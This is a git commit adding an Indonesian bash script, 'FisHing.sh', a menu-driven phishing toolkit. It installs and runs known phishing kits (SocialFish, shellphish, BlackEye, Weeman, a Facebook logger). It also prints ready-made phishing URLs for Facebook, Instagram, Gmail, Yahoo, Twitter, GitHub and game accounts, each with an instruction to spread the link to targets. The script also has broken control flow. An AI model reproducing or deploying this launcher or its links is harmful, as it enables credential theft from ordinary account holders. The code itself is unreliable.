fa993c918737935afb9024bed28369c4666b9861
N1C3-FR13ND-hacker <66993314+N1C3-FR13ND-hacker@users.noreply.github.com>
2020-06-16 14:38:48 +0700

    Add files via upload

---
+++ FisHing.sh
@@ -0,0 +1,790 @@
+#import marshal
+#gak bisa di recode woi=kvkdkdkkckcidjsjjjcjcjdkkss/c/c//vf/dd//c/vkdjdjkkckcjcjcjdjcjjvj jcjxjcjcjjvjcjvjvjckmdmcjvkckd/c//v/v/f//d/v/v//v/d/d//v/b/v/d//v/b/v/f//f/v/v/b//v/v/v//v/v/v//v/v/v/v/v//v/b/b/b/b//v/f/d/f/cjdijvvius7f8b5b45v7d8dcufufufuucufucucucjcjcjcjcjjfjdjfjfjjdiososofoofododofoofofofoeosodofoeisisisisiisididododododododoodododododkkfovibsopsovoboosodofoovovododovovododofovo iosowow993948283748959592igigjjendjgieowoofovoekkd=_::-\-\=\|-\_\=|=|=|=\\=\_\=|=|_|+|=||=|_|=||=|-|-|_|_||__--~`-={||{+
+
+
+
+
+#gak usah di edit edit nanti bisa eror 
+#facebook =ZET PRO ID (HACKER PRO)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#Gak Boleh Gerecode ya
+#hargai pembuat
+#yang gerecode besok mati
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+#Ahh dak tau diri kau gerecode tools orang
+echo
+clear
+figlet "Install" 
+sleep 2
+figlet "tools"
+sleep 2
+figlet "nya"
+sleep 2
+clear
+pkg install git
+pkg install weeman
+pkg install python2
+pkg install mechanize
+pkg install yagmail
+pip2 install mechanize
+pkg install nano
+pkg install figlet
+pkg install if
+pkg install python
+pip2 install mechanize
+pip2 install bs4
+apt install update
+apt install upgrade
+gem install toilet
+pkg install toilet
+pkg install bash
+pkg install sh
+clear
+neofetch
+echo $red "maaf setelah anda memilih script nya lalu bisa,masuk script nya tapi. terakhir nya ada tulisan eror ,itu bukan eror itu biasa saja tapi bisa di gunakan bro"
+echo $red "lihat informasi linuk dulu",
+sleep 10
+clear
+echo
+echo
+echo
+
+
+
+
+echo $green  "_____ ___ ____  _   _ ___ _   _  ____"
+echo $green  "|  ___|_ _/ ___|| | | |_ _| \ | |/ ___|"
+echo $green  "| |_   | |\___ \| |_| || ||  \| | |  _"
+echo $green  "|  _|  | | ___) |  _  || || |\  | |_| |"
+echo $green  "|_|   |___|____/|_| |_|___|_| \_|\____|"
+sleep 3
+            toilet -f standard "TOOLS" -F gay 
+sleep 3
+echo
+echo
+       echo $cyan "[+==============================+]"
+       echo $cyan "|BY:N1C3 FR13ND                  |"
+       echo $cyan "|Facebook:ZET PRO ID(Hacker pro) |"
+       echo $cyan "|NO WA:089524437115              |"
+       echo $cyan "[+==============================+]"
+echo
+echo
+sleep 3
+echo $blue   "+==========================================+"
+echo $blue   "[F15H1N5 LENGKAP (HACKER METODE)           ]"
+echo $blue   "+==========================================+"
+echo $green  "|1.Fishing Facebook                        |"
+echo $blue   "+==========================================+"
+echo $purple "|2.socialFish                              |"
+echo $blue   "+==========================================+"
+echo $cyan   "|3.shellphish                              |"
+echo $blue   "+==========================================+"
+echo $red    "|4.BLACkEYE                                |"
+echo $blue   "+==========================================+"
+echo $white  "|5.WEEMAN                                  |"
+echo $blue   "+==========================================+"
+echo $yellow "|6.Fishing Dragon City Game                |"
+echo $blue   "+==========================================+"
+echo $green  "|7.Fishing INSTAGRAM                       |"
+echo $blue   "+==========================================+"
+echo $purple "|8.Fishing akun YOUTUBE                    |"
+echo $blue   "+==========================================+"
+echo $yellow "|9.Looger Dark Facebook                    |"
+echo $blue   "+==========================================+"
+echo $cyan   "|10.Fishing akun 8 pool game               |"
+echo $blue   "+==========================================+"
+echo $red    "|11.Fishing FREE FIRE Game                 |"
+echo $blue   "+==========================================+"
+echo $white  "|12.Fishing Yahoo akun                     |"
+echo $blue   "+==========================================+"
+echo $yellow "|13.Fishing akun Gamil                     |"
+echo $blue   "+==========================================+"
+echo $green  "|14.Fishing Akun League Legends            |"
+echo $blue   "+==========================================+"
+echo $purple "|15.Fishing akun Hotmail                   |"
+echo $blue   "+==========================================+"
+echo $cyan   "|16.Fishing akun ML game                   |"
+echo $blue   "+==========================================+"
+echo $red    "|17.Fishing akun PUBG game                 |"
+echo $blue   "+==========================================+"
+echo $white  "|18.Fishing akun AOV                       |"
+echo $blue   "+==========================================+"
+echo $yellow "|19.Fishing akun TWITTER                   |"
+echo $blue   "+==========================================+"
+echo $green  "|20.Fishing Akun GitHub                    |"
+echo $blue   "+==========================================+"
+echo $blue   "|00.Exit                                   |"
+echo $blue   "+==========================================+"
+echo
+echo $red
+echo $cy"┌==="$bi"[ N1C3 FR13ND ]"
+echo $cy"¦"
+read -p"-->" root;
+
+
+
+
+if [ $root = 1 ] || [ $root = 1 ]
+then
+clear
+figlet "Mama" | lolcat
+figlet "muda" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo $red "Mencari Link Fishing....."
+echo
+sleep 5
+echo
+echo
+echo
+echo $cyan "Link Fishing->http://zaonguyen.us/23901//CoPf0/?sc=11&sc=11&l=1&ppy=7055929&i=7055929"
+echo
+echo
+echo
+sleep 2
+echo $cyan "Sebarkan Link ini ke target"
+fi
+
+
+
+if [ $root = 2 ] || [ $root = 2 ]
+then
+clear
+figlet "Situs" | lolcat
+sleep 2
+clear
+git clone https://github.com/UndeadSec/SocialFish.git
+cd SocialFish
+chmod +x *
+pip2 install -r requirements.txt
+python2 SocialFish.py
+fi
+
+
+
+if [ $root = 3 ] || [ $root = 3 ]
+then
+clear
+figlet "Kopi" | lolcat
+sleep 3
+clear
+git clone https://github.com/thelinuxchoice/shellphish
+cd shellphish
+bash shellphish.sh
+fi
+
+
+
+if [ $root = 4 ] || [ $root = 4 ]
+then
+clear
+figlet "Indah" | lolcat
+sleep 3
+clear
+git clone https://github.com/thelinuxchoice/blackeye
+cd blackeye
+chmod +x *
+bash blackeye.sh
+fi
+
+
+
+if [ $root = 5 ] || [ $root = 5 ]
+then
+clear
+figlet "Enakkk" | lolcat
+sleep 3
+clear
+git clone https://github.com/evait-security/weeman
+cd weeman
+chmod +x *
+python2 weeman.py
+fi
+
+
+
+if [ $root = 6 ] || [ $root = 6 ]
+then
+clear
+figlet "sedap" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing..."
+echo
+sleep 5
+echo
+echo
+echo $green "Link nya->http://zaonguyen.us/31072//CoPf0/?sc=14&sc=14&l=1&ppy=7055929&i=7055929"
+sleep 1
+echo
+echo
+echo
+echo $red  "Sebarkan Link ini Ke Target"
+fi
+
+
+
+
+if [ $root = 7 ] || [ $root = 7 ]
+then
+clear
+figlet "Seramm" | lolcat
+clear
+echo
+echo
+echo
+echo
+echo $red " Mencari Link Fishing..."
+echo
+sleep 5
+echo
+echo
+echo $cyan "Link nya->http://zaonguyen.us/31072//CoPf0/?sc=35&sc=35&l=1&ppy=7055929&i=7055929"
+echo
+echo
+echo $red  "Sebarkan Link itu ke target"
+fi
+
+
+
+
+if [ $root = 8 ] || [ $root = 8 ]
+then
+clear
+figlet "Nakel" | lolcat
+clear
+echo 
+echo
+echo
+echo
+echo $red "Mencari Link Fishing...."
+echo
+sleep 5
+echo
+echo
+echo $green "Link nya->http://alphalink.biz/l.php?link=//Zq6DCfzkHiWG90Q/yt/en/?i=7055929"
+echo
+echo
+echo $red   "Sebarkan Link Itu ke target"
+fi
+
+
+
+if [ $root = 9 ] || [ $root = 9 ]
+then
+clear
+figlet "Asikk" | lolcat
+clear
+git clone  https://github.com/KingMrZ17/Logger-X-Creator
+pip install yagmail
+pip2 install yagmail
+cd Logger-X-Creator
+python run.py
+fi
+
+
+
+if [ $root = 10 ] || [ $root = 10 ]
+then
+clear
+figlet "Goyang" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "mencari Link Fishing..."
+sleep 5
+echo
+echo
+echo
+echo $green "Link nya->http://zaonguyen.us/94502//CoPf0/?sc=6&sc=6&l=1&ppy=7055929&i=7055929"
+echo
+echo
+echo $red "Sebarkan Link itu Ke target"
+fi
+
+
+
+if [ $root = 11 ] || [ $root = 11 ]
+then
+clear
+figlet "Pacar" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "Mencari Link fishing nya..."
+echo
+sleep 5
+echo
+echo
+echo $cyan "Link nya->http://zaonguyen.us/94502//CoPf0/?sc=1&sc=1&l=1&ppy=7055929&i=7055929"
+echo
+echo $red  "Sebarkan Link Itu ke Target"
+echo 
+echo
+fi
+
+
+
+
+if [ $root = 12 ] || [ $root = 12 ]
+then
+clear
+figlet "cinta" | lolcat
+figlet "Kamu"  | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing nya..."
+echo
+sleep 5
+echo
+echo
+echo $green "Link nya->http://alphalink.biz/l.php?link=//Zq6DCfzkHiWG90Q/yh/en/?i=7055929"
+echo
+echo
+echo $red   "sebarkan Link itu ke target"
+echo
+echo
+fi
+
+
+
+
+if [ $root = 13 ] || [ $root = 13 ]
+then
+clear
+figlet "Kenapa" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing..."
+echo
+sleep 5
+echo
+echo $cyan "Link nya->http://alphalink.biz/l.php?link=//Zq6DCfzkHiWG90Q/gm/en/?i=7055929"
+echo
+echo
+echo $red "Sebarkan Link itu Ketarget"
+echo
+echo
+fi
+
+
+
+if [ $root = 14 ] || [ $root = 14 ]
+then
+clear
+figlet "Kucing" | lolcat
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing nya...."
+sleep 5
+echo
+echo
+echo $cyan "Link nya->http://alioztas.com.tr/l.php?link=//Zq6DCfzkHiWG90Q/lol/en/?i=7055929"
+echo
+echo
+echo $red  "sebarkan Link Itu Ke target"
+echo
+echo
+fi
+
+
+
+
+if [ $root = 15 ] || [ $root = 15 ] 
+then
+clear
+figlet "Tiara" | lolcat
+fuglet "sayangku" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red  "Mancari Link Fishing nya...."
+echo
+sleep 5
+echo
+echo $yellow  "Link nya->http://alphalink.biz/l.php?link=//Zq6DCfzkHiWG90Q/ht/en/?i=7055929"
+echo
+echo
+echo
+echo $red "Sebarkan Link itu ke target"
+fi
+
+
+
+if [ $root = 16 ] || [ $root = 16 ]
+then
+clear
+figlet "sayurr" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "Memcari Link fishing nya..."
+sleep 5
+echo
+echo
+echo $purple  "Link nya->http://zaonguyen.us/94502//CoPf0/?sc=1&sc=1&l=1&ppy=7055929&i=7055929"
+echo
+echo
+echo $red "sebarkan Link itu Ke target"
+fi
+
+
+
+
+if [ $root = 17 ] || [ $root = 17 ]
+then
+clear
+figlet "Hacker" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing nya...."
+echo
+sleep 5
+echo
+echo $cyan "Link nya->http://zaonguyen.us/94502//CoPf0/?sc=1&sc=1&l=1&ppy=7055929&i=7055929"
+echo
+echo
+echo $red  "Sebarkan Link itu Ke target"
+echo
+echo
+fi
+
+
+
+if [ $root = 18 ] || [ $root = 18 ]
+then
+clear
+figlet "Ninja" | lolcat
+sleep 3
+clear
+echo 
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing nya...."
+echo
+sleep 5
+echo
+echo $green "Link nya->http://zaonguyen.us/94502//CoPf0/?sc=1&sc=1&l=1&ppy=7055929&i=7055929"
+echo
+echo
+echo $red "Sebarkan Link itu ke target"
+echo
+echo
+fi
+
+
+
+
+if [ $root = 19 ] || [ $root = 19 ]
+then
+clear
+figlet "Goblok" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing nya...."
+echo
+sleep 5
+echo
+echo $cyan "link nya->http://alphalink.biz/l.php?link=//Zq6DCfzkHiWG90Q/tw/en/?i=7055929"
+echo
+echo
+echo $red "Sebarkan Link itu ke Target"
+echo
+echo
+fi
+
+
+
+
+if [ $root = 20 ] || [ $root = 20 ]
+then
+clear
+figlet "20" | lolcat
+sleep 3
+clear
+echo
+echo
+echo
+echo
+echo
+echo $red "Mencari Link Fishing nya...."
+echo
+sleep 5
+echo
+echo $green "Link nya->http://zaonguyen.us/94502//CoPf0/?sc=1&sc=1&l=1&ppy=7055929&i=7055929"
+echo
+echo
+echo $red  "Sebarkan Link itu ke Target"
+echo
+echo
+fi
+
+
+
+
+
+if [ $lurr = 00 ] || [ $lurr = 00 ]
+then
+echo $red "Buru-Buru amat bro"
+sleep 1
+echo $yellow "Yaudah lah, Thanks."
+sleep 1
+echo $green "Jika ada yang eror langsung chat aja di gue"
+sleep 3
+exit
+fi
+
+
+*) echo "Pilihan yang kamu cari tidak tersedia !"
+esac
+done
+done
